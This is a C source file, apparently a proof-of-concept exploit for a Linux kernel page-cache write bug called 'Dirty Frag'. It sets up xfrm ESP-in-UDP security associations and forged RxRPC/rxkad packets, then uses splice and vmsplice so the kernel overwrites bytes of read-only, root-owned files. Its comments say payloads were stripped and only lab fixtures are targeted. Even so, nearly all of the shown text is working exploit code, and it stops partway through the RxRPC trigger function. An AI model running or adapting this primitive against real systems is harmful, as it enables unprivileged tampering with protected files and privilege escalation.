/*
 * N4C primitive-only Dirty Frag demonstrator.
 *
 * Protocol details were derived from the Linux source and the public
 * V4bel/dirtyfrag reference implementation at commit
 * aab16fcada27142dd8ce8704906cf6736cf213b8.  This rewrite removes the
 * privileged-file payloads, PAM/NSS handling and interactive shell code.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <poll.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <linux/rxrpc.h>
#include <linux/keyctl.h>
#include <linux/if_alg.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

/*
 * This branch is deliberately a primitive-only PoC.  It writes markers to
 * two root-owned, read-only lab fixtures and never touches a system binary or
 * authentication database.  See prepare-lab.sh for the exact initial bytes.
 */
#define ESP_PORT           4500
#define ESP_PACKET_SEQ     200
#define ESP_REPLAY_SEQ     100
#define ESP_SPI            0x4e344301
#define ESP_TARGET         "/dirtyfrag-esp-target"
#define RXRPC_TARGET       "/dirtyfrag-rxrpc-target"

static const uint8_t esp_marker[4] = { 'N', '4', 'C', '!' };
static int verbose;

#define VLOG(tag, fmt, ...) do { \
	if (verbose) fprintf(stderr, "[%s] " fmt "\n", tag, ##__VA_ARGS__); \
} while (0)

static int write_proc(const char *path, const char *buf)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return -1;
	int n = write(fd, buf, strlen(buf));
	close(fd);
	return n;
}

static void setup_userns_netns(void)
{
	uid_t real_uid = getuid();
	gid_t real_gid = getgid();
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		VLOG("esp", "unshare: %s", strerror(errno));
		exit(1);
	}
	write_proc("/proc/self/setgroups", "deny");
	char map[64];
	snprintf(map, sizeof(map), "0 %u 1", real_uid);
	if (write_proc("/proc/self/uid_map", map) < 0) {
		VLOG("esp", "uid_map: %s", strerror(errno)); exit(1);
	}
	snprintf(map, sizeof(map), "0 %u 1", real_gid);
	if (write_proc("/proc/self/gid_map", map) < 0) {
		VLOG("esp", "gid_map: %s", strerror(errno)); exit(1);
	}
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) { VLOG("esp", "socket: %s", strerror(errno)); exit(1); }
	struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
	if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { VLOG("esp", "SIOCGIFFLAGS: %s", strerror(errno)); exit(1); }
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { VLOG("esp", "SIOCSIFFLAGS: %s", strerror(errno)); exit(1); }
	close(s);
}

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
	struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len  = RTA_LENGTH(len);
	memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
{
	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (sk < 0) return -1;
	struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
	if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

	char buf[4096] = {0};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_pid   = getpid();
	nlh->nlmsg_seq   = 1;
	nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

	struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	xs->id.daddr.a4 = inet_addr("127.0.0.1");
	xs->id.spi      = htonl(spi);
	xs->id.proto    = IPPROTO_ESP;
	xs->saddr.a4    = inet_addr("127.0.0.1");
	xs->family      = AF_INET;
	xs->mode        = XFRM_MODE_TRANSPORT;
	xs->replay_window = 0;
	xs->reqid       = 0x1234;
	xs->flags       = XFRM_STATE_ESN;
	xs->lft.soft_byte_limit   = (uint64_t)-1;
	xs->lft.hard_byte_limit   = (uint64_t)-1;
	xs->lft.soft_packet_limit = (uint64_t)-1;
	xs->lft.hard_packet_limit = (uint64_t)-1;
	xs->sel.family  = AF_INET;
	xs->sel.prefixlen_d = 32;
	xs->sel.prefixlen_s = 32;
	xs->sel.daddr.a4 = inet_addr("127.0.0.1");
	xs->sel.saddr.a4 = inet_addr("127.0.0.1");

	{
		char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
		memset(alg_buf, 0, sizeof(alg_buf));
		struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
		strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name)-1);
		aa->alg_key_len   = 32 * 8;
		aa->alg_trunc_len = 128;
		memset(aa->alg_key, 0xAA, 32);
		put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
	}
	{
		char alg_buf[sizeof(struct xfrm_algo) + 16];
		memset(alg_buf, 0, sizeof(alg_buf));
		struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
		strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
		ea->alg_key_len = 16 * 8;
		memset(ea->alg_key, 0xBB, 16);
		put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
	}
	{
		struct xfrm_encap_tmpl enc;
		memset(&enc, 0, sizeof(enc));
		enc.encap_type  = UDP_ENCAP_ESPINUDP;
		enc.encap_sport = htons(ESP_PORT);
		enc.encap_dport = htons(ESP_PORT);
		enc.encap_oa.a4 = 0;
		put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
	}
	{
		char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
		memset(esn_buf, 0, sizeof(esn_buf));
		struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esn_buf;
		esn->bmp_len       = 1;
		esn->oseq          = 0;
		esn->seq           = ESP_REPLAY_SEQ;
		esn->oseq_hi       = 0;
		esn->seq_hi        = patch_seqhi;
		esn->replay_window = 32;
		put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
	}

	if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
	char rbuf[4096];
	int n = recv(sk, rbuf, sizeof(rbuf), 0);
	if (n < 0) { close(sk); return -1; }
	struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
	if (rh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = NLMSG_DATA(rh);
		if (e->error) { close(sk); return -1; }
	}
	close(sk);
	return 0;
}

static int do_one_write(const char *path, off_t offset, uint32_t spi)
{
	int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_recv < 0) return -1;
	int one = 1;
	setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	struct sockaddr_in sa_d = {
		.sin_family = AF_INET,
		.sin_port   = htons(ESP_PORT),
		.sin_addr   = { inet_addr("127.0.0.1") },
	};
	if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
		close(sk_recv); return -1;
	}
	int encap = UDP_ENCAP_ESPINUDP;
	if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
		close(sk_recv); return -1;
	}
	int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_send < 0) { close(sk_recv); return -1; }
	if (connect(sk_send, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
		close(sk_send); close(sk_recv); return -1;
	}
	int file_fd = open(path, O_RDONLY);
	if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }

	int pfd[2];
	if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

	uint8_t hdr[24];
	*(uint32_t*)(hdr + 0) = htonl(spi);
	*(uint32_t*)(hdr + 4) = htonl(ESP_PACKET_SEQ);
	memset(hdr + 8, 0xCC, 16);

	struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
	if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
		close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
	}
	off_t off = offset;
	ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
	if (s != 16) {
		close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
	}
	s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
	/* still proceed regardless of splice rc — kernel may have already
	 * decrypted the page in the time between splice and recv */
	usleep(150 * 1000);

	close(file_fd); close(pfd[0]); close(pfd[1]);
	close(sk_send); close(sk_recv);
	return s == 40 ? 0 : -1;
}

static int read_bytes(const char *path, off_t offset, void *buf, size_t len)
{
	int fd = open(path, O_RDONLY);
	if (fd < 0) return -1;
	ssize_t got = pread(fd, buf, len, offset);
	close(fd);
	return got == (ssize_t)len ? 0 : -1;
}

static int esp_trigger(void)
{
	setup_userns_netns();
	usleep(100 * 1000);

	uint32_t marker_word =
		((uint32_t)esp_marker[0] << 24) |
		((uint32_t)esp_marker[1] << 16) |
		((uint32_t)esp_marker[2] << 8) |
		esp_marker[3];

	if (add_xfrm_sa(ESP_SPI, marker_word) < 0)
		return -1;

	return do_one_write(ESP_TARGET, 0, ESP_SPI);
}

static int esp_poc(void)
{
	uint8_t before[sizeof(esp_marker)], after[sizeof(esp_marker)];
	if (read_bytes(ESP_TARGET, 0, before, sizeof(before)) < 0) {
		fprintf(stderr, "[esp] cannot read %s: %s\n", ESP_TARGET, strerror(errno));
		return 2;
	}
	if (memcmp(before, esp_marker, sizeof(before)) == 0) {
		fprintf(stderr, "[esp] fixture already contains the marker; run prepare-lab.sh again\n");
		return 2;
	}

	fprintf(stderr, "[esp] before: %02x %02x %02x %02x\n",
		before[0], before[1], before[2], before[3]);

	pid_t cpid = fork();
	if (cpid < 0) return 2;
	if (cpid == 0) {
		int rc = esp_trigger();
		_exit(rc == 0 ? 0 : 2);
	}
	int cstatus;
	waitpid(cpid, &cstatus, 0);
	if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
		fprintf(stderr, "[esp] trigger setup failed (status=0x%x)\n", cstatus);
		return 2;
	}

	if (read_bytes(ESP_TARGET, 0, after, sizeof(after)) < 0)
		return 2;
	fprintf(stderr, "[esp] after : %02x %02x %02x %02x\n",
		after[0], after[1], after[2], after[3]);

	if (memcmp(after, esp_marker, sizeof(after)) != 0) {
		fprintf(stderr, "[esp] marker unchanged: shared-frag write was rejected\n");
		return 1;
	}
	fprintf(stderr, "[esp] page-cache primitive observed: marker is now N4C!\n");
	return 0;
}

/* RxRPC/RXKAD page-cache write primitive. */

#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef PF_RXRPC
#define PF_RXRPC AF_RXRPC
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef MSG_SPLICE_PAGES
#define MSG_SPLICE_PAGES 0x8000000
#endif

/* ---- rxrpc constants ---- */
#define RXRPC_PACKET_TYPE_DATA          1
#define RXRPC_PACKET_TYPE_ACK           2
#define RXRPC_PACKET_TYPE_ABORT         4
#define RXRPC_PACKET_TYPE_CHALLENGE     6
#define RXRPC_PACKET_TYPE_RESPONSE      7
#define RXRPC_CLIENT_INITIATED          0x01
#define RXRPC_REQUEST_ACK               0x02
#define RXRPC_LAST_PACKET               0x04
#define RXRPC_CHANNELMASK               3
#define RXRPC_CIDSHIFT                  2

struct rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t  type;
	uint8_t  flags;
	uint8_t  userStatus;
	uint8_t  securityIndex;
	uint16_t cksum;        /* big-endian on wire */
	uint16_t serviceId;
} __attribute__((packed));

struct rxkad_challenge {
	uint32_t version;
	uint32_t nonce;
	uint32_t min_level;
	uint32_t __padding;
} __attribute__((packed));

/* Attacker-chosen 8-byte session key used for the rxkad token.
 * The offline search changes this key until the decrypted fixture bytes
 * satisfy the marker constraints described below. */
static uint8_t SESSION_KEY[8] = {
	0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
};

#define LOG(fmt, ...) fprintf(stderr, "[rxrpc] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define DBG(fmt, ...) VLOG("rxrpc", fmt, ##__VA_ARGS__)

/* =================================================================== */
/* rxrpc key (rxkad v1 token with attacker session key)                 */
/* =================================================================== */

static long key_add(const char *type, const char *desc,
		const void *payload, size_t plen, int ringid)
{
	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
{
	uint8_t *p = out;
	uint32_t now = (uint32_t)time(NULL);
	uint32_t expires = now + 86400;
	*(uint32_t *)p = htonl(0); p += 4;   /* flags */
	const char *cell = "evil";
	uint32_t clen = strlen(cell);
	*(uint32_t *)p = htonl(clen); p += 4;
	memcpy(p, cell, clen);
	uint32_t pad = (4 - (clen & 3)) & 3;
	memset(p + clen, 0, pad);
	p += clen + pad;
	*(uint32_t *)p = htonl(1); p += 4;   /* ntoken */
	uint8_t *toklen_p = p; p += 4;
	uint8_t *tokstart = p;
	*(uint32_t *)p = htonl(2); p += 4;   /* sec_ix = RXKAD */
	*(uint32_t *)p = htonl(0); p += 4;   /* vice_id */
	*(uint32_t *)p = htonl(1); p += 4;   /* kvno */
	memcpy(p, SESSION_KEY, 8); p += 8;   /* session_key K */
	*(uint32_t *)p = htonl(now); p += 4;
	*(uint32_t *)p = htonl(expires); p += 4;
	*(uint32_t *)p = htonl(1); p += 4;   /* primary_flag */
	*(uint32_t *)p = htonl(8); p += 4;   /* ticket_len */
	memset(p, 0xCC, 8); p += 8;          /* ticket */
	uint32_t toklen = (uint32_t)(p - tokstart);
	*(uint32_t *)toklen_p = htonl(toklen);
	if ((size_t)(p - out) > maxlen) { errno = E2BIG; return -1; }
	return (int)(p - out);
}

static long add_rxrpc_key(const char *desc)
{
	uint8_t buf[512];
	int n = build_rxrpc_v1_token(buf, sizeof(buf));
	if (n < 0) return -1;
	return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
}

/* =================================================================== */
/* AF_ALG pcbc(fcrypt) helpers                                          */
/* =================================================================== */

static int alg_open_pcbc_fcrypt(const uint8_t key[8])
{
	int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (s < 0) { WARN("socket(AF_ALG): %s", strerror(errno)); return -1; }
	struct sockaddr_alg sa = { .salg_family = AF_ALG };
	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		WARN("bind(AF_ALG pcbc(fcrypt)): %s", strerror(errno));
		close(s); return -1;
	}
	if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) < 0) {
		WARN("ALG_SET_KEY: %s", strerror(errno));
		close(s); return -1;
	}
	return s;
}

/* Encrypt-or-decrypt a 1+ block of data with a given IV. */
static int alg_op(int alg_s, int op, const uint8_t iv[8],
		const void *in, size_t inlen, void *out)
{
	int op_fd = accept(alg_s, NULL, NULL);
	if (op_fd < 0) { WARN("accept(AF_ALG): %s", strerror(errno)); return -1; }

	char cbuf[CMSG_SPACE(sizeof(int)) +
		CMSG_SPACE(sizeof(struct af_alg_iv) + 8)] = {0};
	struct msghdr msg = {0};
	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);

	struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_OP;
	c->cmsg_len = CMSG_LEN(sizeof(int));
	*(int *)CMSG_DATA(c) = op;

	c = CMSG_NXTHDR(&msg, c);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_IV;
	c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 8);
	struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(c);
	aiv->ivlen = 8;
	memcpy(aiv->iv, iv, 8);

	struct iovec iov = { .iov_base = (void *)in, .iov_len = inlen };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;

	if (sendmsg(op_fd, &msg, 0) < 0) {
		WARN("AF_ALG sendmsg: %s", strerror(errno));
		close(op_fd); return -1;
	}
	ssize_t n = read(op_fd, out, inlen);
	close(op_fd);
	if (n != (ssize_t)inlen) {
		WARN("AF_ALG read got %zd want %zu: %s",
				n, inlen, strerror(errno));
		return -1;
	}
	return 0;
}

/* Compute conn->rxkad.csum_iv (ref: rxkad_prime_packet_security):
 *   tmpbuf[0..3] = htonl(epoch, cid, 0, security_ix)  (16 B)
 *   PCBC-encrypt(tmpbuf, IV=session_key) → out[16]
 *   csum_iv = out[8..15]   (last 8 B = "tmpbuf[2..3]" after encryption)
 */
static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
		const uint8_t key[8], uint8_t csum_iv[8])
{
	int s = alg_open_pcbc_fcrypt(key);
	if (s < 0) return -1;
	uint32_t in[4]  = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
	uint8_t  out[16];
	int rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
	close(s);
	if (rc < 0) return -1;
	memcpy(csum_iv, out + 8, 8);
	return 0;
}

/* Compute the wire cksum (ref: rxkad_secure_packet @rxkad.c:342):
 *   x = (cid_low2 << 30) | (seq & 0x3fffffff)
 *   buf[0] = htonl(call_id), buf[1] = htonl(x)    (8 B)
 *   PCBC-encrypt(buf, IV=csum_iv) → enc[8]
 *   y = ntohl(enc[1]); cksum = (y >> 16) & 0xffff;  if zero -> 1
 */
static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
		const uint8_t key[8], const uint8_t csum_iv[8],
		uint16_t *cksum_out)
{
	int s = alg_open_pcbc_fcrypt(key);
	if (s < 0) return -1;
	uint32_t x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
	x |= seq & 0x3fffffff;
	uint32_t in[2] = { htonl(call_id), htonl(x) };
	uint32_t out[2];
	int rc = alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
	close(s);
	if (rc < 0) return -1;
	uint32_t y = ntohl(out[1]);
	uint16_t v = (y >> 16) & 0xffff;
	if (v == 0) v = 1;
	*cksum_out = v;
	return 0;
}

/* =================================================================== */
/* AF_RXRPC client                                                      */
/* =================================================================== */

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
	int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (fd < 0) { WARN("socket(AF_RXRPC client): %s", strerror(errno)); return -1; }
	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
				keyname, strlen(keyname)) < 0) {
		WARN("client SECURITY_KEY: %s", strerror(errno)); close(fd); return -1;
	}
	int min_level = RXRPC_SECURITY_AUTH;
	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
				&min_level, sizeof(min_level)) < 0) {
		WARN("client MIN_SECURITY_LEVEL: %s", strerror(errno));
		close(fd); return -1;
	}
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = 0;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(local_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
		WARN("client bind :%u: %s", local_port, strerror(errno));
		close(fd); return -1;
	}
	LOG("AF_RXRPC client bound :%u", local_port);
	return fd;
}

static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
		uint16_t service_id,
		unsigned long user_call_id)
{
	char data[8] = { 'P', 'I', 'N', 'G', 'P', 'I', 'N', 'G' };
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = service_id;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(srv_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);

	char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
	struct msghdr msg = {0};
	msg.msg_name = &srx; msg.msg_namelen = sizeof(srx);
	struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;
	msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
	*(unsigned long *)CMSG_DATA(cmsg) = user_call_id;

	/* Don't block forever if no reply ever comes through this single sendmsg. */
	int fl = fcntl(cli_fd, F_GETFL);
	fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);

	ssize_t n = sendmsg(cli_fd, &msg, 0);
	fcntl(cli_fd, F_SETFL, fl);
	if (n < 0) {
		if (errno == EAGAIN || errno == EWOULDBLOCK) {
			LOG("client sendmsg returned EAGAIN (expected; kernel will keep "
					"retrying handshake)");
			return 0;
		}
		WARN("client sendmsg: %s", strerror(errno));
		return -1;
	}
	LOG("client sendmsg %zd B → :%u (handshake will follow asynchronously)",
			n, srv_port);
	return 0;
}

/* =================================================================== */
/* fake-server (plain UDP)                                              */
/* =================================================================== */

static int setup_udp_server(uint16_t port)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) { WARN("socket(udp server): %s", strerror(errno)); return -1; }
	struct sockaddr_in sa = {0};
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		WARN("udp server bind :%u: %s", port, strerror(errno));
		close(s); return -1;
	}
	LOG("plain UDP fake-server bound :%u", port);
	return s;
}

/* Receive one UDP datagram with timeout (ms). Returns bytes or -1. */
static ssize_t udp_recv_to(int s, void *buf, size_t cap,
		struct sockaddr_in *from, int timeout_ms)
{
	struct pollfd pfd = { .fd = s, .events = POLLIN };
	int rc = poll(&pfd, 1, timeout_ms);
	if (rc <= 0) return -1;
	socklen_t fl = from ? sizeof(*from) : 0;
	return recvfrom(s, buf, cap, 0,
			(struct sockaddr *)from, from ? &fl : NULL);
}

/* =================================================================== */
/* main PoC                                                             */
/* =================================================================== */

static int trigger_seq = 0;

static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
{
	char keyname[32];
	snprintf(keyname, sizeof(keyname), "evil%d", trigger_seq++);

	long key = add_rxrpc_key(keyname);
	if (key < 0) {
		if (trigger_seq < 5) WARN("add_rxrpc_key(%s): %s", keyname, strerror(errno));
		return -1;
	}

	/* Use varying ports so kernel TIME_WAIT / stale state does not bite. */
	uint16_t port_S = 7777 + (trigger_seq * 2 % 200);
	uint16_t port_C = port_S + 1;
	uint16_t svc_id = 1234;

	int udp_srv = setup_udp_server(port_S);
	if (udp_srv < 0) {
		if (trigger_seq < 5) WARN("setup_udp_server(%u) failed", port_S);
		syscall(SYS_keyctl, 3 /*KEYCTL_INVALIDATE*/, key); return -1;
	}

	int rxsk_cli = setup_rxrpc_client(port_C, keyname);
	if (rxsk_cli < 0) {
		if (trigger_seq < 5) WARN("setup_rxrpc_client(%u, %s) failed", port_C, keyname);
		close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	if (rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD) < 0) {
		if (trigger_seq < 5) WARN("rxrpc_client_initiate_call failed");
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	uint8_t pkt[2048];
	struct sockaddr_in cli_addr;
	ssize_t n = udp_recv_to(udp_srv, pkt, sizeof(pkt), &cli_addr, 1500);
	if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) {
		if (trigger_seq < 5) WARN("udp_recv_to: n=%zd errno=%s", n, strerror(errno));
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
	struct rxrpc_wire_header *whdr_in = (struct rxrpc_wire_header *)pkt;
	uint32_t epoch  = ntohl(whdr_in->epoch);
	uint32_t cid    = ntohl(whdr_in->cid);
	uint32_t callN  = ntohl(whdr_in->callNumber);
	uint16_t svc_in = ntohs(whdr_in->serviceId);
	uint16_t cli_port = ntohs(cli_addr.sin_port);

	/* Send CHALLENGE */
	{
		struct {
			struct rxrpc_wire_header hdr;
			struct rxkad_challenge   ch;
		} __attribute__((packed)) c = {0};
		c.hdr.epoch = htonl(epoch);
		c.hdr.cid = htonl(cid);
		c.hdr.callNumber = 0; c.hdr.seq = 0;
		c.hdr.serial = htonl(0x10000);
		c.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE;
		c.hdr.securityIndex = 2;
		c.hdr.serviceId = htons(svc_in);
		c.ch.version = htonl(2); c.ch.nonce = htonl(0xDEADBEEFu);
		c.ch.min_level = htonl(1);
		struct sockaddr_in to = { .sin_family=AF_INET, .sin_port=htons(cli_port),
			.sin_addr.s_addr=htonl(0x7F000001) };
		if (sendto(udp_srv, &c, sizeof(c), 0, (struct sockaddr*)&to, sizeof(to)) < 0) {
			close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
		}
	}

	/* Drain RESPONSE (best-effort) */
	for (int i = 0; i < 4; i++) {
		struct sockaddr_in src;
		if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &src, 500) < 0) break;
	}

	/* csum + cksum with CURRENT SESSION_KEY */
	uint8_t csum_iv[8] = {0};
	if (compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
	uint16_t cksum_h = 0;
	if (compute_cksum(cid, callN, 1, SESSION_KEY, csum_iv, &cksum_h) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	/* Build malicious DATA header */
	struct rxrpc_wire_header mal = {0};
	mal.epoch = htonl(epoch);
	mal.cid = htonl(cid);
	mal.callNumber = htonl(callN);
	mal.seq = htonl(1);
	mal.serial = htonl(0x42000);
	mal.type = RXRPC_PACKET_TYPE_DATA;
	mal.flags = RXRPC_LAST_PACKET;
	mal.securityIndex = 2;
	mal.cksum = htons(cksum_h);
	mal.serviceId = htons(svc_in);

	/* connect udp_srv → client port for splice */
	struct sockaddr_in dst = { .sin_family=AF_INET, .sin_port=htons(cli_port),
		.sin_addr.s_addr=htonl(0x7F000001) };
	if (connect(udp_srv, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	/* pipe + vmsplice header + splice file → pipe → udp_srv */
	int p[2];
	if (pipe(p) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
	{
		struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };
		if (vmsplice(p[1], &viv, 1, 0) < 0) goto trig_fail;
	}
	{
		loff_t off = splice_off;
		if (splice(target_fd, &off, p[1], NULL, splice_len, SPLICE_F_NONBLOCK) < 0)
			goto trig_fail;
	}
	if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0) < 0) {
		goto trig_fail;
	}
	close(p[0]); close(p[1]);

	/* recvmsg the malicious DATA into the kernel's verify_packet path */
	int fl = fcntl(rxsk_cli, F_GETFL);
	fcntl(rxsk_cli, F_SETFL, fl | O_NONBLOCK);
	for (int round = 0; round < 5; round++) {
		char rb[2048];
		struct sockaddr_rxrpc srx;
		char ccb[256];
		struct msghdr m = {0};
		struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
		m.msg_name = &srx; m.msg_namelen = sizeof(srx);
		m.msg_iov = &iv;  m.msg_iovlen = 1;
		m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
		ssize_t r = recvmsg(rxsk_cli, &m, 0);
		if (r > 0) break;
		if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(20000);
		else break;
	}
	fcntl(rxsk_cli, F_SETFL, fl);

